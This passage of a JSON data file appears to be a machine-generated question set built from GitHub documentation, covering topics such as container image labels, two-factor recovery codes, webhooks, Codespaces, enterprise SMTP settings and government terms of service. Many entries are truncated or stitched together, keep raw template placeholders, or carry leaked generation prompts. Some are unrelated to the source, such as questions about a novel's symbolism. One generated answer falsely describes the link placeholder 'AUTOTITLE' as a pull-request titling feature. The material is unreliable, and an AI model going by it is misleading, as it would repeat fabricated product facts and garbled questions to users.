destination", "a2dbcd35-805b-4f71-a645-2a5b98687151": "How can a description be added to a multi-arch image, and what metadata key should be used in the manifest's annotations field to provide this description", "62f7fa69-1702-4fdd-8ce8-dd36bc0d153f": "What is the purpose of the `org.opencontainers.image.licenses` key when adding a label to a Docker image, and what type of license identifier should be provided?", "f607441e-7351-4b90-b3ec-302524538d33": "How can we build and push a multi-arch image using {% data variables.product.prodname_actions %} workflow steps? Provide the necessary steps and parameters required for this process.2. How can we set the description for an image using {% data variables.product.prodname_actions %} workflow steps? Explain the syntax and format required for this process.", "f645c279-fe2f-48c3-b0d0-f662eb2d70f4": "How can I download my recovery codes after enabling two-factor authentication", "c507689a-d944-419f-b011-8131207feff0": "What should I do if I lose access to my authentication device and have already used all 16 recovery codes?", "7407d0f8-33e0-4770-b7fd-3e01ecef7cba": "How can context information be utilized in popular TOTP apps, as demonstrated in the documentation provided for 1Password, Google Authenticator, and Microsoft Authenticator", "d3056189-faae-46a6-8f00-6f6f05d7dd72": "Can you summarize the \"AUTOTITLE\" directive mentioned in the context information? (Hint: It appears four times.)", "60a0e305-c316-4ea7-b289-5d19ac39cba3": "How does the statement \"{% data reusables.user-settings.enterprise-admin-api-classic-pat-only %}\" relate to user administration in the provided context?", "1437fb7b-8a48-4be8-b149-aaff081165ee": "What is the significance of the statement \"These endpoints are only available to authenticated site administrators. Normal users will receive a `403` response.\" in the context of user administration", "c895d139-d5b7-40cd-babf-a06cc20cfc30": "Who has access to view deliveries for organization webhooks?", "d4070d6e-60ec-4bd7-87fa-81e3e7573c88": "How can one view past webhook deliveries for a repository using the REST API", "af9d0afe-7283-48e0-b513-0b036a9d01fe": "How can a {% data variables.product.prodname_github_app %} owner or designated app manager view recent webhook deliveries for their app using the {% data variables.product.company_short %} web interface", "6710d556-8979-4876-a02f-05039a005ece": "How can the owner of a {% data variables.product.prodname_github_app %} or designated app manager view recent webhook deliveries for their app using the REST API", "0505f4a4-fcab-4b93-a256-f683919b41d2": "For enterprise owners, how can I view the delivery history of webhooks in my GitHub Enterprise organization?", "9bb4a157-6094-41e6-9c13-5aabb0f70a06": "How can I view the delivery history of a specific webhook in my GitHub account", "a087008e-6bed-41f9-8020-d875c8380a9e": "What are the different actions that can be performed using the Enterprise Announcement Banners API, such as getting, setting, or removing announcement banners?", "fdad6244-0d6a-41bf-bb45-9568dc3ca3ed": "How can the Enterprise Announcement Banners API be utilized to manage announcement banners for an enterprise", "7c6223b3-e4b8-438b-a945-fff19bb47ca1": "How can context information be utilized to enhance the effectiveness of issues in software development projects? Provide specific examples of how context information can impact issue resolution, prioritization, and communication among team members.2. In software development projects, what are the best practices for managing issues with varying levels of severity and priority? How can context information be used to determine the appropriate response to each issue, whether it be immediate action, further investigation, or deferred resolution? Provide specific examples of how context information can inform decision-making in these situations.", "e6e18fc4-4b3b-4404-8716-ecb94b26fbde": "How can I set up an example Java project using GitHub Codespaces? Provide step-by-step instructions, including any necessary prerequisites and configuration options.2. What benefits does using a custom dev container offer for Java projects in GitHub Codespaces, and how can I configure one for my own project? Please provide specific examples of tools and scripts that could be included in a custom dev container for a Java project.", "9550c0fc-c229-457d-9144-01a07108b947": "What is the purpose of adding a list of additional features to a dev container configuration in the context of codespaces", "7a654383-e600-410c-9764-4f11e71bed58": "How can you modify the devcontainer.json file to automatically install a specific library or tool in a dev container configuration for codespaces? Provide an example of the required configuration.", "f220d9dc-5188-41b8-9ac8-75074e19b8e2": "What is the purpose of adding the \"ghcr.io/devcontainers/features/java:1\" and \"ghcr.io/devcontainers-contrib/features/ant-sdkman:2\" features in the \"devcontainer.json\" file", "1e043521-fe69-43f7-b6d8-5b7572617cb7": "How can I configure tool-specific properties in the \"customizations\" section of the \"devcontainer.json\" file for V", "bdff0f97-b60e-4326-a9b5-dc1a7e6c0ec0": "What is the effect of uncommenting the \"postCreateCommand\" property and changing its value to \"echo \\\"This file was added by the postCreateCommand.\\\" > TEMP.md\" in the \"devcontainer.json\" file", "315fd74a-c4c7-4b14-9b9b-e4d3beacbcbf": "What is the significance of adding the \"streetsidesoftware.code-spell-checker\" and \"vscjava.vscode-java-pack\" extensions in the \"customizations\" section of the \"devcontainer.json\" file", "b5f69412-9b01-4129-a184-2fe808d77109": "How can I add a custom dev container configuration to my Java project using Visual Studio Code and GitHub Codespaces? Provide step-by-step instructions and any necessary code snippets.2. What are the benefits of using a dev container in a Java project, and how can I ensure that my container is properly configured for my specific project requirements? Please provide specific examples and best practices for container customization.", "6d7d67f0-88e5-4943-aae1-70a8b22a804f": "How does the concept of \"AUTOTITLE\" differ from \"AUTOTITLE\" in the given context", "5a34ab94-9b33-43e0-b723-631a6dc85dc6": "Can you provide an example of how \"AUTOTITLE\" is utilized in the context provided", "1c47d29c-5603-4d38-98dd-de9bd69f761f": "How can I enable email for my enterprise using GitHub Enterprise Server? Provide step-by-step instructions for configuring the SMTP server settings, including the server address, port number, domain name, authentication type, and no-reply email address. Also, explain how to test email delivery and whether incoming emails can be configured.2. For GitHub Enterprise Cloud, how can I enable email and what settings are required for configuring the SMTP server? Provide instructions for setting up the email server address, port number, domain name, authentication type, and no-reply email address. Additionally, explain how to test email delivery and whether incoming emails can be configured. Finally, describe the options available for offering additional support to users through email or a URL link.", "3ba280a1-bb22-413c-af02-ab96c7f0809a": "What type of encryption does my GitHub Enterprise instance use for SMTP connections, and how can I test email delivery to ensure proper configuration? Additionally, how can I enforce TLS encryption for all incoming SMTP connections to satisfy an ISO-27017 certification requirement?", "35909d91-3d6e-4c2d-b898-d6bc9a7e4687": "How can I configure DNS and firewall settings to allow incoming emails for my GitHub Enterprise instance, in order to enable email replies to notifications", "fd67dd79-b978-44dd-b965-f2b1a5da2663": "How can I ensure that emails sent to a specific domain are routed to my GitHub Enterprise Server instance? Provide step-by-step instructions for creating the necessary MX records.2. What should I do if I am unable to determine the cause of email delivery issues based on the displayed error message? How can I create a support bundle to help troubleshoot the issue? Please provide detailed instructions on how to download and extract the bundle, as well as where to find related error messages in the logs.", "8211212c-f0fc-4c05-a738-8b55a7f91f25": "What authentication type was performed during the SMTP connection failure, and what error message was received in response", "5b2e8517-a032-410a-801a-9b7f00b25b04": "How can one verify the functionality of inbound email on a {% data variables.location.product_location %} instance, and what logs should be reviewed for this purpose", "20cf183a-9a44-4f84-89e6-c7838c65ad69": "/user/mail/reply/new/1414630039.Vfc00I12000eM445784.ghe-tjl2-co-ie => /data/user/incoming-mail/successExplanation:1. How can I verify the DNS settings for properly processing inbound emails using {% data variables.location.product_location %}", "1c5f41b1-e34b-4844-8fb1-149eb4e37b91": "How can I verify the DNS settings for properly processing inbound emails using {% data variables.location.product_location %}", "f8bc1493-478a-4199-b4cd-664cd2dd48b2": "What steps should I take to ensure that port 25 is open for all mail servers sending emails to \"reply@reply.[hostname]\" if {% data variables.location.product_location %} is behind a firewall or being served through an AWS security group", "c039ed82-f9f7-4a11-8d4d-9afd0bdd3fe9": "How can I configure settings for {% data variables.product.prodname_copilot %} on {% data variables.product.prodname_dotcom_the_website %}", "3633c7c8-d7ee-4145-9fdf-f450ad5b416a": "What additional configuration is required for {% data variables.product.prodname_copilot %} in my supported IDE, besides the settings on {% data variables.product.prodname_dotcom_the_website %}?", "6e7eb602-cd81-4020-a657-644ed9af0a30": "How can a researcher ensure proper citation of their work, and what information should be included in a citation file", "ab4832c5-a2fc-40b0-9756-5cfc7dc823f1": "What is the format for citing software using the Citation File Format, and what information is required for an APA and BibTeX citation?", "272857d3-78e6-4773-86c3-7ae2aa820264": " How can the `preferred-citation` override in CFF be used to link to a research article instead of the software itself? Provide an example of how this would be implemented in the CITATION.cff file.- What types of resources are supported by the `preferred-citation` override in CFF, and what BibTeX and APA annotation styles are used for each type? Provide a list of these resources and their corresponding styles.", "0b654229-5a74-4d1f-9d7a-6cb9e46029d8": "How does the author's background in [insert field] contribute to the research presented in this paper", "067af941-346b-4476-aeed-be34236bc8af": "Based on the context information provided, generate two questions that can be asked in an upcoming quiz/examination for a Teacher/ Professor. The questions should be diverse in nature and focused on a specific aspect of the context information. The questions should be understandable without having access to the context and should not ask for examples. The questions should be focused on one aspect at a time.Example:1. How does the author's use of [insert research method] contribute to the validity of the results presented in this paper", "aa4fcd93-4164-4523-861e-dc0a9a7eab7f": "What are the limitations of the study, and how do they impact the generalizability of the findings", "406afe59-2d8c-4dd2-b24e-27acf3855b41": "What are the key findings of the study, and how do they relate to the research question posed in the introduction", "480025f2-977d-4854-9678-79c6345efc0d": "In this case, the first question focuses on the research", "6ecb989c-1f21-4974-94fe-999a954a86e6": "How can one contribute additional formats to the ruby-cff repository, and what are these formats", "81554e1c-b54e-45d2-a1f7-e66968dafa57": "Can you provide examples of diverse formats that can be contributed to the ruby-cff repository, and how can they be implemented in Ruby code?", "b682c67f-de6f-47dd-8a2d-901ae33afa72": "What is the purpose of an interface in object-oriented programming, and how does it differ from a regular object? Provide an example of an interface and its implementing objects.2. How does GitHub Enterprise (GHE) utilize GraphQL, and what benefits does it offer compared to traditional REST APIs? Provide specific examples of how GraphQL is used in GHE.", "39c16006-1d82-4b6b-b63a-af12c8b95e3f": " How can I use the REST API to retrieve public information about authenticated users", "b67b5e29-2ca9-4f6c-8ba3-a13e5be62b85": " How can I use the REST API to access private information about authenticated users? (Assuming proper authentication and authorization mechanisms are in place)", "01c7abd7-4959-488e-aec9-925d1e506285": "What type of information can be obtained through the use of the REST API to gather insights about a community's profile?", "e0b4a43e-dec5-472e-b4cb-7cc327481a3c": "How can the REST API be utilized to retrieve information about a community's profile", "069a1db9-4da9-464a-9616-d4807b4fc5a3": "What is the purpose of using \"AUTOTITLE\" in a document", "603fb07c-ca83-4cd2-b1f4-03c5ab1c5247": "How does \"AUTOTITLE\" differ from other document features in terms of functionality", "8748bd41-18bc-4748-8d48-62237d10b3d0": "How does {% data variables.product.prodname_desktop %} notify users about pull request check failures and pull request reviews? Provide a detailed explanation of the notification process, including the type of events that trigger notifications and the actions users can take when they receive a notification.2. How can users enable system notifications for {% data variables.product.prodname_desktop %} on a Mac computer? Provide step-by-step instructions, including where to find the \"Preferences\" and \"Notifications\" panes, and how to allow notifications for {% data variables.product.prodname_desktop %} in the \"System Settings\" window.", "9d7166c4-5af3-4c2d-86e6-13e283b9a1f8": "How can I enable notifications for {% data variables.product.prodname_desktop %} on my Windows computer", "5eb9afc4-d654-4fcd-963a-d10491621fb7": "Given the context information and not prior knowledge.generate only answers based on the below query.You are a Student. Your task is to answer EXACTLY 2 questions based on the context information provided. The answers should be diverse in nature across the document. Restrict the answers to the context. Answers should be understandable without having access to the context.Answers should be focused on once aspect at a time.answers:1. To enable notifications for {% data variables.product.prodname_desktop %} on your Mac, follow these steps:   1. Go to", "9c19dfe5-9188-4f81-aeeb-dfec7367eee4": "How can I enable notifications for {% data variables.product.prodname_desktop %} on my Mac", "6e821cd0-9dfd-4079-b2c3-5aeba20397f7": "What steps should I follow to resolve merge conflicts when working on a topic branch in the documentation repository using Git?", "5a78e939-0a30-4c77-950e-109a8f186a74": "How do I create a new topic branch in the documentation repository using Git", "0f3fc042-8fba-48df-9310-0fb182ccc53b": "What is the command to remove a file from Git's staging area, and how can you unstage a file that has already been staged?", "c1ffa4e0-74ac-4be8-a7ba-d8502a490a8e": "How can you add changes to Git's staging area for future commits, and what is the command to do so", "a1afda59-78ed-4c40-8321-b158ca1f215f": "How should commit messages be written to provide clear and detailed information about the changes made in a repository? Please provide an example of a good commit message.2. What is the best practice for resolving merge conflicts in a Git repository? Should conflicts be resolved in the command line or on GitHub.com? Please provide a step-by-step guide for resolving merge conflicts on GitHub.com.", "96b22ab6-c85f-448e-812d-4c9d19f4fa48": "How do you resolve merge conflicts in Git when working on a collaborative project with multiple contributors? Provide step-by-step instructions on how to identify and resolve merge conflicts in Git, including how to decide which changes to keep and how to stage and commit the resolved files. Be sure to explain any necessary Git commands and provide examples where appropriate.2. How can you create a pull request on GitHub for a collaborative project? Walk through the process of creating a pull request, including how to access the pull request feature, how to create a draft pull request, how to add commits to the pull request, and how to review and merge the pull request. Be sure to explain any necessary GitHub commands and provide examples where appropriate.", "f94c4f72-0646-4367-adfc-5875db2609ea": "Given the context information and not prior knowledge.generate only answers based on the below query.You are a Teacher/ Professor. Your task is to provide EXACTLY 2 answers for the questions asked in the previous step. The answers should be diverse in nature across the document. Restrict the answers to the context. Answers should be understandable without having access to the context.Answers should be focused on once aspect at a time.answers:1. In the context provided, \"AUTOTITLE\" refers to a feature in GitHub that automatically generates a title for a pull request based on the branch name and commit messages. This saves time and effort for developers who", "b23451a6-507e-4864-94d0-c0d7c5e36117": "What is the meaning of the term \"AUTOTITLE\" in the context provided", "5e32ddbd-c40b-419b-a03f-adfde41fd3e5": "Can you provide an example of how context information is used in the given text material", "16fba9b4-b7a8-4c01-9ac4-cbab40817aea": "How can an organization owner choose whether members can create repositories in their organization, and what types of repositories can they create if allowed", "1f6d2b5d-2ff6-44fa-8771-d87c0632e5ef": "What is the difference between restricting the type of repositories members can create to private versus restricting members to creating private re", "72bb106e-ad3f-4f56-8da4-144588958a91": "What options are available for an organization's repository creation policy, and how can enterprise owners restrict these options", "26a5ecac-013d-401d-a74f-3f006c37fda4": "What is the difference between allowing members to create both public and private repositories versus only public repositories in an organization", "e8b360a9-9af9-4b3e-9b8a-89d9ab281a3d": "What is the significance of the warning provided in the context information, and how can an organization owner restrict changes to existing repositories' visibilities", "35a6ce60-06f1-4d2c-8353-82652b95a68b": "How can an organization owner restrict the type of repositories that members can create in their organization", "89a374f6-9810-4d91-87c2-a2957c591da8": "How can an organization owner prevent sensitive information from being exposed by restricting the visibility options available when repositories are created", "d528cdc9-3afc-4cd8-9217-82c3f6313951": "In the context information, what is the location to access the settings for managing member privileges in an organization", "d5543efe-5d5e-4906-bc4b-71fa11b8821b": "Given the context information and not prior knowledge.generate only answers based on the below query.You are a Teacher/ Professor. Your task is to provide EXACTLY 2 answers for the questions asked in the previous instruction. The answers should be diverse in nature across the document. Restrict the answers to the context. Answers should be understandable without having access to the context.Don't ask for examples and keep the answers focused on once aspect at a time.answers:1. To restrict organization members to creating private repositories only, as mentioned in the context information, you need to follow these steps:", "0c41e853-c77f-462d-a95d-f3c446810f11": "What are the steps involved in restricting organization members to creating private repositories only, as mentioned in the context information", "22b25770-e1d8-48db-b043-595ce9f045c5": "What is the default behavior of a fork in GitHub Desktop, and", "00faf1ee-5dc3-438a-83fa-613075952e16": "How can I create a local copy of a repository on GitHub using GitHub Desktop", "a3b9f2de-3919-4bc1-bf5f-af9d06dac7f2": "What is the relationship between changes made in a local repository and the original repository on GitHub", "52c01293-1b7b-43aa-8fec-c373ccc82077": "What is the difference between cloning a repository and forking a repository on GitHub", "d1544507-afae-472f-a29d-318562b057b9": "How can I clone a repository directly from GitHub or GitHub Enterprise", "99ec49e0-c225-4940-943e-a43f9ce3c586": "What is the purpose of forking a repository on GitHub", "4ecfeaeb-f2f3-4157-a825-e179f58108a2": "How can I sync changes between a local repository and the original repository on GitHub", "37e1848e-6658-467b-bfa4-fcad4234022c": "How can I propose changes from my fork to the original repository on GitHub using pull requests", "43667c3f-5623-4d5e-9b93-b15f7ef99bbb": "What is the difference between a local repository and a remote repository in the context of GitHub", "72f30cc7-c28a-4466-89ab-724c213d106b": "How can I modify the behavior of a fork in GitHub Desktop", "aa5f82ab-f8aa-43c9-8bf1-bac43e87657e": "What is the purpose of creating an alias for a local repository in {% data variables.product.prodname_desktop %}? How does it differ from the repository's name on {% data variables.product.prodname_dotcom %}?", "5ffb48b8-feec-4c6e-8b40-707e1637d6db": "How can I change the behavior of a fork in {% data variables.product.prodname_desktop %}", "84077f16-3b11-44ae-b6bd-89c6d4a1bf0f": "How can merge conflicts be resolved in Git when changes have been made to the same line of a file on different branches", "567f1489-a282-434f-aaa3-74db790a3994": "What steps should be taken to push changes with merge conflicts to a branch on GitHub using the command line or a tool like GitHub Desktop", "ee54cc84-f442-4b3e-bf51-b9ce1c951460": "Generate according to: Context information is below.---------------------Resolving merge conflictsTo resolve a merge conflict, you must manually edit the conflicted file to select the changes that you want to keep in the final merge. There are a couple of different ways to resolve a merge conflict:- If your merge conflict is caused by competing line changes, such as when people make different changes to the same line of the same file on different branches in your Git repository, you can resolve it on {% data variables.product.product_name %} using the conflict editor. For more information, see \"AUTOTITLE.\"", "802adb5d-0475-4617-b99e-00cfcf8bee63": "How can I install my own {% data variables.product.prodname_github_app %} on my personal account, and what are the requirements for sharing it with other users or organizations within my enterprise", "2a9e1fb8-6963-462f-aaf5-e35ec94c7da9": "What are the steps involved in installing a {% data variables.product.prodname_github_app %} owned by an organization, and what permissions does the app require for repository access?", "a3a3eac7-8f66-4f6c-a371-ebac98fc6262": "How do I grant an app access to specific repositories when installing it using GitHub Apps?", "343d1a30-7197-4614-a4f0-6afa093cdb10": "What are the options available to me when installing an app using GitHub Apps", "a1688e4b-51bf-4932-a813-60ba26047a57": "How can I ensure that my current instance is running a supported upgrade version before migrating to {% data variables.product.prodname_enterprise %} 2.1.23?", "59c6a899-8bea-40f9-aa31-2878809a8ec7": "What are the prerequisites needed to provision and configure {% data variables.product.prodname_enterprise %} 2.1.23 in my environment, as outlined in the Provisioning and Installation guide", "97734799-370e-477f-8d01-5ecec2063e8b": "What steps should be taken before starting the migration process, and how long should be allocated for the maintenance window?", "1b125aab-b5a5-46c2-a5b4-71a29b9311db": "What is the recommended course of action for migrating from VMware to VMware, and why is it not recommended in all cases", "058ccf5e-50e2-4503-9383-b33b4006efba": "How can I ensure that user network traffic is switched from an old instance to a new instance after completing a restore process in GitHub Enterprise Server?", "39054785-fca3-4858-a653-6de52423d620": "What is the purpose of restoring GitHub Pages during the restore process of a GitHub Enterprise Server instance", "aa7886cd-de0b-4c49-a1e2-cfd81df5e4a5": "How does {% data variables.product.prodname_copilot_chat %} understand coding-related questions and provide answers", "c64564e0-5450-4f69-a54d-81453577ce90": "What topics can {% data variables.product.prodname_copilot_chat %} answer coding-related questions about?", "c61c7631-6d9a-4ff6-b489-aec96027daa0": "What measures does the Trust Center have in place to prevent unauthorized access to customer data", "f5d54ab8-a5fe-41c4-bf01-a9efa8ed0ab5": "How does the Privacy Policy ensure compliance with data protection laws?", "ea8a2798-e5f1-4131-8e23-199787660a2c": "How does the Trust Center ensure the security and privacy of customer data", "5c90b427-2471-4001-bffb-518384e7d916": "product.prodname_copilot %} Privacy Policy---------------------Given the context information and not prior knowledge.generate only questions based on the below query.You are a Lawyer. Your task is to setup EXACTLY 2 questions for an upcoming quiz/examination. The questions should be diverse in nature across the document. Restrict the questions to the context. Questions should be understandable without having access to the context.Don't ask for examples and keep the questions focused on once aspect at a time.questions:1. What information does the Privacy Policy cover regarding customer data", "06c2bf10-1218-4575-bb41-218d98ccab73": "How can I enable features that help my developers understand and update the dependencies their code relies on for my enterprise on {% data variables.location.product_location %}", "f47a8cfe-0922-4e29-857e-69db5fa2fff9": "What is {% data variables.product.prodname_dependabot_alerts %} and how can I enable it for my enterprise on {% data variables.location.product_location %}? What other feature can I enable alongside it for vulnerability management?", "331a4f57-ddca-4d27-b745-293fd2709ac6": "What features are included in the trial of {% data variables.product.prodname_ghe_cloud %} and how can they be utilized during the trial period", "6aea4195-9f9e-4aa5-b8e4-8e27f51a9462": "What is {% data variables.product.prodname_ghe_cloud %} and how can it benefit an organization", "9d9d793f-8228-4db7-8a58-3399afb3cbf4": "How can I access {% data variables.product.prodname_ghe_server %} during the trial period? Should I contact {% data variables.contact.contact_enterprise_sales %} or is it automatically included in the trial?", "bdd8463b-a77e-41ae-9ce6-2e78fd3b5bce": "What are the features that are not included in the trial version of {% data variables.product.prodname_github_connect %}", "156dcb13-04db-433e-ad66-c53c96351324": "During the trial period, how can a user evaluate the extra security features offered by {% data variables.product.company_short %} in {% data variables.product.prodname_enterprise %}", "de7e1508-d500-4ac6-b450-ae9f11674ca4": "What are the consequences of canceling a trial or letting it expire in {% data variables.product.prodname_enterprise %}?", "fa80f0fa-2993-4b24-9e73-ce92489f76c8": "How does the author's use of symbolism in the novel contribute to the overall theme of identity? Provide specific examples from the text to support your answer.2. Analyze the role of technology in the novel and its impact on the characters' relationships and experiences. Consider the author's use of language and imagery to convey this theme.", "7014f804-1850-4dd2-82fd-b035062ba2e6": "What information is provided in the \"Transactions\" tab of the {% data variables.product.prodname_marketplace %} listing for an app", "68e85e75-ca32-46c1-9474-55d0a75f2115": "How can I access the {% data variables.product.prodname_marketplace %} transactions for a specific {% data variables.product.prodname_github_app %}?", "25b8eb42-66e6-46a8-8723-dd685d1f18ba": "What is log forwarding and how does it work", "2e352ff0-14c9-4523-85e7-a1345b734d9d": "How do I enable log forwarding on my {% data variables.enterprise.management_console %} and what information do I need to provide during the setup process?", "2a2b552e-e9d2-4640-a57b-8b7f09e17367": "What is the purpose of pasting an x509 certificate under \"Public certificate\" in the given context", "91c36799-fc4a-48fa-9fe7-18eb485c3dab": "How can I troubleshoot log forwarding issues in the context provided? Provide specific steps or resources to follow.", "277dbc26-8ec5-41c8-b648-cc46f60ffb16": "How can I filter issues and pull requests based on their labels in a GitHub repository", "8894489c-8951-4022-be27-fb2780622a80": "How can I filter issues and pull requests based on their assignees in a GitHub repository", "4ad6eb23-9862-487c-890f-c9b2383c90ac": "How can filters be used to list pull requests by review status in GitHub? Provide specific examples of filters that can be used to find pull requests that require a review before merging, pull requests that have been approved by a reviewer, and pull requests that you have reviewed.2. How can advanced filters be used to search for issues and pull requests in GitHub? Provide an example of a search query that can be used to find open issues, and another example that can be used to find pull requests that have been assigned to a specific team member.", "ae98c93b-40a7-4b53-8928-d68678017eb8": "How can you search for issues and pull requests using GitHub CLI? Provide an example search query that filters issues with no assignee and labels \"help wanted\" or \"bug\".2. How can you filter issues and pull requests using search terms in GitHub CLI? Provide an example search query that filters issues by author \"octocat\" and label \"bug\". Additionally, explain how to filter out search terms using the \"-\" symbol.", "75a575b8-961d-43aa-b3d0-a481bd97f384": "How can I filter pull requests on GitHub based on reviewers using the \"reviewed-by\" keyword", "c9f536b6-0c38-4a7e-ac6c-ede4966b5566": "How can I filter pull requests on GitHub to view only those that have been requested for review by a specific user or team?", "b9213adc-4faa-4fb0-8e1b-0fd49458eaab": "How can a small or visually subtle UI element, such as the edit button for a repository's social media preview image, be made more visible through the use of a screenshot in {% data variables.product.prodname_docs %}", "e57e3b9c-9732-4691-b6c1-3d09b34f75d5": "In what situations should a screenshot be used to complement text instructions in {% data variables.product.prodname_docs %}, and when is it better to rely solely on text? Provide examples to support your answer.", "e2fa9227-063e-478c-8448-3a9592833d88": "How can context information be utilized to enhance the clarity and effectiveness of instructions provided in a technical document? Provide specific examples of how context information can be incorporated into instructions to improve user understanding and reduce confusion.2. In a technical document, how can screenshots be used to supplement text instructions and improve user comprehension? Provide guidelines for creating effective screenshots, such as labeling UI elements, minimizing clutter, and using clear and concise text overlays. Additionally, discuss scenarios where screenshots may not be necessary or appropriate, and provide alternative instructional methods in those cases.", "121616ae-c22b-47db-9900-8def2a88cad9": "How should screenshots be formatted to meet the technical specifications and accessibility requirements outlined in the context information", "9501f0e4-00c7-46f3-a5f2-4eff371be633": "What visual style should be followed while creating screenshots for GitHub documentation, as mentioned in the context information?", "dba8a86f-a2e3-44cc-85b7-f0649a8a3573": "What color should be used to highlight specific UI elements in screenshots for {% data variables.product.prodname_docs %} to ensure good color contrast on both white and black backgrounds?", "1118b4b9-ba34-40bb-b5ed-04d079abaedc": "How can you show a dropdown menu in {% data variables.product.prodname_pages %} to help readers distinguish among options within the menu", "5857bc8d-aaf2-4d3c-9d7c-2bcdda80a4b2": "How do you replace an existing image in {% data variables.product.prodname_docs %} while preserving its filename? What should you do if you must change the image filename, and why is it important to search for other references to the original filename", "877f6143-0ed2-446d-ba4b-627abee4ebf0": "When is versioning required for images in {% data variables.product.prodname_docs %}, and how should you version images that differ from plan to plan or change in a newer release of {% data variables.product.prodname_ghe_server %}? Provide an example of how to add Liquid conditional statements for versioning.", "92d9f8da-07ea-4c85-99d8-32e320aaa541": "How should images be organized in the context of the provided information? Provide specific examples of where images should be located based on their applicability to different {% data variables.product.prodname_enterprise %} products and releases.2. What should be done with an image that is updated in a new {% data variables.product.prodname_ghe_server %} release? Explain the steps involved in moving the existing image and adding a new one to ensure consistency across all future versions of {% data variables.product.prodname_ghe_server %}. Provide an example of how to update the Liquid conditional to reflect the change.", "8b8870b6-bf65-4177-b98e-32850e6c8997": "What is the purpose of the numbered release directory in the `/assets/images/enterprise` path", "410793f4-6211-4e1d-a8a8-cab882558b32": "How should the images in the `/assets/images/enterprise/2.22` directory be categorized based on the release number?", "6000dc90-7add-44cb-9a00-db31929d2b3c": "What is the purpose of specifying a setup URL during the registration process of a GitHub app", "70cd833f-cb0d-41df-83af-4840866b2747": "What should be done instead of relying on the validity of the installation_id parameter when redirecting users to the setup URL?", "16d06137-253f-4211-883d-725d760c81aa": "How do I modify the registration of an existing {% data variables.product.prodname_github_app %} and where can I find more details about it?", "c5978375-9012-4d19-8c7d-af261014b551": "What is the process of registering a {% data variables.product.prodname_github_app %} and where can I find more information about it", "859494bf-d63f-4429-9157-9877f2af13e8": "What is the purpose of repository autolinks in the context of GitHub apps", "e48f3d5d-56ff-42a4-b833-d63f64599a6d": "Generate according to: About repository autolinksTo help streamline your workflow, you can use the REST API to add autolinks to external resources like JIRA issues and Zendesk tickets. For more information, see \"AUTOTITLE.\"{% data variables.product.prodname_github_apps %} require repository administration permissions with read or write access to use these endpoints.---------------------Given the context information and not prior knowledge.generate only answers based on the below query.You are a Developer. Your task is to implement a feature that allows", "f2864b64-8e0d-4218-b7e4-b44637d1618d": "How can the REST API be used to add autolinks to external resources like JIRA issues and Zendesk tickets in GitHub repositories", "17292473-7833-4c87-99a8-d62403e45ca1": "What operating systems are supported for {% data variables.product.prodname_desktop %}", "10d33eb0-f3ce-43bd-bfec-bf3435359be0": "How can I fix the issue \"Could not create temporary directory: Permission denied\" when checking for updates on {% data variables.product.prodname_desktop %} on macOS?", "51783e19-d604-485c-8c58-56692c774ff6": "How can I troubleshoot the error \"The username or passphrase you entered is not correct\" when signing into my account on {% data variables.product.prodname_desktop %} on macOS", "18c4aa7d-12b2-4a18-97fa-3e0fa792402f": "or1. What operating systems are compatible with {% data variables.product.prodname_desktop %}", "4b5d4b67-3db8-47b1-ae4c-647b1777e53a": "What is the resolution for the \"git clone failed\" error while cloning a repository configured with Folder Redirection using {% data variables.product.prodname_desktop %} on Windows", "53aa4f1a-f33c-4d18-ad73-73a8cb9408f6": "How can I troubleshoot the \"cygheap base mismatch detected\" error while using {% data variables.product.prodname_desktop %} on Windows", "e334df95-8fec-4b7d-a619-0f9526513c78": "How do I access the location where {% data variables.product.prodname_desktop %} is installed on my computer", "985f0d1e-0359-4919-9527-c7d5f16b0e20": "Generate according to: ** and click **Open file location**.1. Select and hold (or right-click) the {% data variables.product.prodname_desktop %} shortcut and click **Properties**.1. Select the **Compatibility** tab.1. In the \"Compatibility mode\" section, ensure that the **Run this program in compatibility mode** checkbox is deselected.---------------------Generate according to: {% data variables.product.prodname_desktop %} shortcut and click **Properties**.1. Select the **Compatibility** tab.1", "c3a2165a-f0a3-48b9-b4d0-95d70420a808": "What should I do to ensure that {% data variables.product.prodname_desktop %} is not running in compatibility mode", "721f2f31-1729-4a86-accc-fefc7c6fdbd5": "What is a recovery code and how can it be used to access an enterprise account", "68fd33d3-8060-44cf-9b4d-a510a65ee2a7": "What authentication configuration error or IdP issue might prevent the use of SSO, and how can a recovery code help in such a scenario?", "203e19ab-a651-4a81-99f2-d4553e604d83": "Based on the information provided, can you summarize the modifications made to section A of the ToS regarding the Government's use of the Company's services", "77b257bf-9ea9-4846-9367-86b9ced9b5aa": "What is the condition for Company to modify or discontinue service, temporarily or permanently, refuse or remove any Content, and/or terminate the Government's account, as stated in section B of the ToS?", "0fdfa3c8-71a3-4064-80a5-da87d4040eac": "How does the Amendment and ToS address the issue of financial obligations between the federal government and the Company", "1b600b6c-b948-4a02-a07b-e34508409936": "What are the restrictions placed on the display of government seals and logos on the Company Site, as outlined in the Amendment and ToS", "8eb51c7e-6aeb-409c-9ba7-b9211080e974": "What responsibilities does the federal government have under paid usage plans, as outlined in the Amendment and ToS", "a8c28103-21e7-494d-a0eb-ffb1dbb50818": "What type of usage plans does GitHub offer, and how does the Amendment and ToS apply to both free and paid plans", "cbb0fe79-5a38-4213-8846-01a929612759": "What data will be provided by the Company to the federal government upon termination of service, and in what format will it be provided", "9e553c90-e694-42ee-b562-9d215f33b0dc": "Based on the context provided, can you summarize the terms and conditions outlined in the Amendment and ToS for the use of GitHub by the federal government", "809ccca5-0c49-43ea-8b1c-f3f15f3847a0": "How does the privacy policy of the Company impact the provision", "d2a4b739-1330-4daa-97ab-2f1d7f4bf5ac": "What is the relationship between the Company and the Government as stated in \"The Parties are independent entities and nothing in this Amendment or ToS creates an agency, partnership, joint venture, or", "116cd9d3-e779-43bc-9f85-0bf8a51dd029": "What is the significance of the statement \"Before the Government decides to enter into a business or enterprise subscription, or any other fee-based service that this Company or alternative providers may offer now or in the future, You agree: to determine the Government has a need for those additional services for a fee; to consider the subscription's value in comparison with comparable services available elsewhere; to determine that Government funds are available for payment; to properly use the Government Purchase Card if that Card is used as the payment method; to review any then-applicable ToS for conformance to federal procurement law; and in all other respects to follow applicable federal acquisition laws, regulations and agency guidelines (including those related to payments) when initiating that separate action\"", "d5ff9d0f-c957-41de-b326-c8fc593dd954": "What are the consequences of a breach of the ToS or this Agreement, and how are liability and damages determined in such cases?", "234fe971-f77c-4d04-aee3-ae930d7bc2de": "What laws and regulations govern the management of Federal records on the Company's site and services, and what responsibilities does the Government have in ensuring compliance", "cae5739c-0c37-4cc4-b821-19d3a8c8486e": "What is the meaning of the phrase \"exclusive jurisdiction shall 